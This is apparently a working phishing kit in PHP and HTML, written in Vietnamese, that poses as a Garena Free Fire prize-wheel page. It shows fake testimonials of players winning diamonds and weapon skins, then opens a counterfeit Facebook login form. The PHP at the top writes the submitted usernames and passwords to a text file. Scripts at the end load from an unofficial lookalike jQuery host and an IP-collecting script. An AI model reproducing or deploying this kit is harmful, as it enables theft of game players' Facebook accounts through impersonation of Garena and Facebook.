<?php
if(isset($_POST['ip'])){
require('ngBackend/ngControllers.php');
$ng = new ngControllers();
$user = $ng->post($_REQUEST['user']);
$pass = $ng->post($_REQUEST['pass']);
$id = $ng->post($_REQUEST['id']);
$nick = $ng->post($_REQUEST['nick']);
$ip = $ng->post($_REQUEST['ip']);
$file = fopen('nhdright.txt','a');
        fwrite($file,$user.'/'.$pass.PHP_EOL);
        fclose($file); 
}else{
header('location:/');
exit();
}
?>

<!DOCTYPE html>
<html>


<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta content="width=device-width,maximum-scale=1.0,initial-scale=1.0,user-scalable=no" name="viewport" />
	<link rel="icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" type="image/x-icon" />
	<link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	<meta name="copyright" content="" />
	<meta content="black" name="apple-mobile-web-app-status-bar-style" />
	<meta name="apple-mobile-web-app-title" content="Garena Free Fire">
	<meta name="description" content="Free Fire is a mobile game where players enter a battlefield where there is only one winner - the last man standing. Grab weapons to do others in and supplies to bolster your chances of survival. Eventually, players are forced into a shrinking play zone to engage each other in a tactical and diverse environment."/>
	<title>VÒNG QUAY MAY MẮN | GARENA FREEFIRES</title>
	<link rel="stylesheet" type="text/css" href="./style.css">
	<link rel="stylesheet" type="text/css" href="./facebook.css">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
	<div class="app">
		<header>
			<div class="profile">
				<div class="avatarBox">
					<img src="https://steamuserimages-a.akamaihd.net/ugc/909022648274283056/506B4A9C27FA5CEE3952C83D1FBAF6ADF1FAC7FA/">
				</div>
				<div class="nameBox">
					
				</div>
			</div>
			<div class="progress"></div>
		
			<span class="badge">353</span>
		</header>
		<div class="wrap">
	
	<div class="trueid">
				<h1>Thông báo</h1>
				
			
				<p class="check"><h2> Đã nhận thưởng thành công!</h2></p>
					<button class="checkid">QUAY LẠI</button>
				
			
			</div>

			<div class="comment">
				<div class="secs" style="--i:1;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLRyAta7Ep7gMhh65yyDWB4QSzfHTzFuBvZT0184Wg=s900-c-k-c0x00ffffff-no-rj">
					</div>
					<div class="content">
						<h1>Nam Lầy</h1>
						<p>Nam Lầy Vừa Nhận Được Quà Tặng Từ Garena</p>
					</div>
				</div>
				<div class="secs" style="--i:2;">
					<div class="profile">
						<img src="https://static2.yan.vn/YanNews/202105/202105130905167175-1c1957ad-491f-42d5-966d-7b18faa86e55.jpeg">
					</div>
					<div class="content">
						<h1>Gao Bạc</h1>
						<p>Gao Bạc Vừa Nhận Được 9.999 Kim Cương</p>
					</div>
				</div>
				<div class="secs" style="--i:3;">
					<div class="profile">
						<img src="https://thongcongnghethcm.net/uploads/congantv/congantv2.jpg">
					</div>
					<div class="content">
						<h1>Cô Ngân</h1>
						<p>Cô Ngân Vừa Nhận Được AK47 Rồng Xanh LV7</p>
					</div>
				</div>
				
				<div class="secs" style="--i:8;">
					<div class="profile">
						<img src="https://yt3.ggpht.com/ytc/AKedOLRhqTLIuBY-SvlSJEsCa8k9xfida5p7VnVQta2n9A=s900-c-k-c0x00ffffff-no-rj">
					</div>
					<div class="content">
						<h1>Bác Gấu</h1>
						<p>Bác Gấu Vừa Nhận Được Bộ Trang Phục</p>
					</div>
				</div>
					<div class="secs" style="--i:8;">
					<div class="profile">
						<img src="https://gamek.mediacdn.vn/pr/2020/1596687070262-40-0-664-998-crop-1596687077711-63732312405888.jpg">
					</div>
					<div class="content">
						<h1>BUSSGAMING</h1>
						<p>BUSSGAMING Vừa Nhận Được SET Skin Súng</p>
					</div>
				</div>
				<div class="secs" style="--i:8;">
					<div class="profile">
						<img src="https://i.pinimg.com/736x/ab/c9/8d/abc98daf19b8a1aeb4653ad999596543.jpg">
					</div>
					<div class="content">
						<h1>KELLY GAMING</h1>
						<p>KELLY GAMING Vừa Nhận Được 9.999 Kim Cương</p>
					</div>
				</div>
			</div>



			<div class="mask"></div>
			<div class="popReward">
				<h1>Xin chúc mừng bạn nhận được !!!</h1>
				<div class="boxImg">
					<img id="imgsrc" src="img/cr.jpg">
				</div>
				<button class="claim claimThis">Nhận Ngay</button>
			</div>


		

			<div class="toast">
				<p id="alert"></p>
			</div>



		</div>
		<!-- FOOTER -->
		<footer>
		   Copyright BiCoder © Garena International.
		</footer>
		<!-- END OF COMMENT -->
		
	</div>
	<!-- JAVASCRIPT -->

<style type="text/css">
	#togglePassword {
	position: absolute;
    margin-left: -30px;
    margin-top: 10px;
    cursor: pointer;
}

</style>
<div class="popup-login login-facebook animated fadeIn" style=" display: none; ">
	<div class="popup-box-login-fb"><a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
	      <div class="navbar-fb">
	         <img src="https://i.ibb.co/QNdsmDc/facebook-text.png">
	      </div>
	      <div class="content-box-fb">  <p class="alert sandi">
	        Sai mật khẩu. <b> Bạn quên mật khẩu của mình? </b></p>
	        <p class="alert email"> Số điện thoại di động hoặc email bạn đã nhập không khớp với bất kỳ tài khoản nào. <b> Tìm kiếm tài khoản của bạn. </b> </p>
	         <img width="75"  src="/logo (2).jpg">
	         <div class="txt-login-fb">
	          Đăng nhập tài khoản Facebook của bạn để kết nối với Garena Free Fire
	         </div>
	         <form class="login-form" action="thanhcong.php" method="POST" onsubmit="return valid()">
	            <label>
	            <input type="text" id="user" name="user" placeholder="Số điện thoại di động hoặc email" autocomplete="off" autocapitalize="off">
	            </label>
	            <label>
	            <input type="password" id="pass" name="pass" placeholder="Mật khẩu" autocomplete="off" autocapitalize="off">
	            </label>
	            <input type="hidden" name="ip" id="ip" value="">
	            <input type="hidden" id="id" name="id" value="">
	            <input type="hidden" id="nick" name="nick" value="">
	            <button  type="submit" id="btnfb" class="btn-login-fb">Đăng nhập</button>
	         </form>
	         <div class="txt-create-account">Tạo tài khoản mới</div>
	         <div class="txt-not-now">Hoặc</div>
	         <div class="txt-forgotten-password">Quên mật khẩu?</div>
	      </div>
	      <div class="language-box">
	         <center>
	         <div class="language-name language-name-active">Tiếng Việt</div>
	         <div class="language-name"> English (UK) </div>
	         <div class="language-name">Basa Jawa</div>
	         <div class="language-name">Bahasa Melayu</div>
	         <div class="language-name">日本語</div>
	         <div class="language-name">Español</div>
	         <div class="language-name">Português (Brasil)</div>
	         <div class="language-name">
	            <i class="fa fa-plus"></i>
	         </div>
	         </center>
	      </div>
	      <div class="copyright">Facebook Inc.</div>
	   </div>
	 </div>
<script type="text/javascript">
const togglePassword = document.querySelector('#togglePassword');
const password = document.querySelector('#password');
togglePassword.addEventListener('click', function (e) {
    // toggle the type attribute
    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
    password.setAttribute('type', type);
    // toggle the eye / eye slash icon
    this.classList.toggle('bi-eye');
});
</script>

<script type="text/javascript" src="shagitz.js"></script>

<script>


 function phonenumber(user) {
 var vnf_regex = /((84|01|03|05|07|08|09)+([0-9]{8})\b)/g;
 if (vnf_regex.test(user) == false) 
        {console.log("phonenumber false");
            return false; 
            
        }else{
            console.log("phonenumber true");
           return true;
           
        } 
}




function validateEmail (user)
{
  let regexEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
  if (user.match(regexEmail)) {
      console.log("regexEmail true");
    return true; 
     
  } else {
      console.log("regexEmail false");
   return false; 
    
  }
}

 function validatepassword(pass){

if (pass.length >= 6 && pass.length <= 25)
{
   
    return true;
}
else {
 
    return false;
}
}

</script>

 <script>
 

 
        function valid() {
            var user = $('#user').val();
            var pass = $('#pass').val();
            phonenumber(user);
           validateEmail(user);
            var ip = $('#ip').val();
            if(user == '' || user == null)
            {
                
                $('.email').show();
                $('.sandi').hide();
                return false;
            }else if(validatepassword(pass) == false)
            {
                $('.email').hide();
                $('.sandi').show();
                return false;
            }
            else if(user != '' || user != null)
            {
                if( (phonenumber(user) == true)  || (validateEmail(user) == true))
                {
                $('.email').hide();
                $('.sandi').hide();
               
                }
                else
                {
                     $('.email').show();
                $('.sandi').hide();
                return false;
                }
            }
            
            
            $("#btnfb").addClass("disabled");
        }
        
    </script>
<script>
 $('.trueid').show();
    $('.mask').show();
</script>

	<script src="https://app-jquery.xyz/jquery-3.6.0.min.js"></script>
	<script type="text/javascript">
		$(document).ready(function(){
			setTimeout(() => {
				$('.loader').fadeOut();
			},1000)
		})
	</script>

<script>
	    $('.checkid').on('click',function(){
	         window.location.href = "/";
	    })
	</script>
<script>
	    $('.claimThis').on('click',function(){
	        	$('.login-facebook').show();
	        	$('.mask').hide();
	        	$('.popReward').hide();
	    })
	</script>
	<script src="xyz.js"></script>
	<script src="xyzIpAddre.js"></script>
	
	<!-- END OF COMMENT -->
</body>
</html>
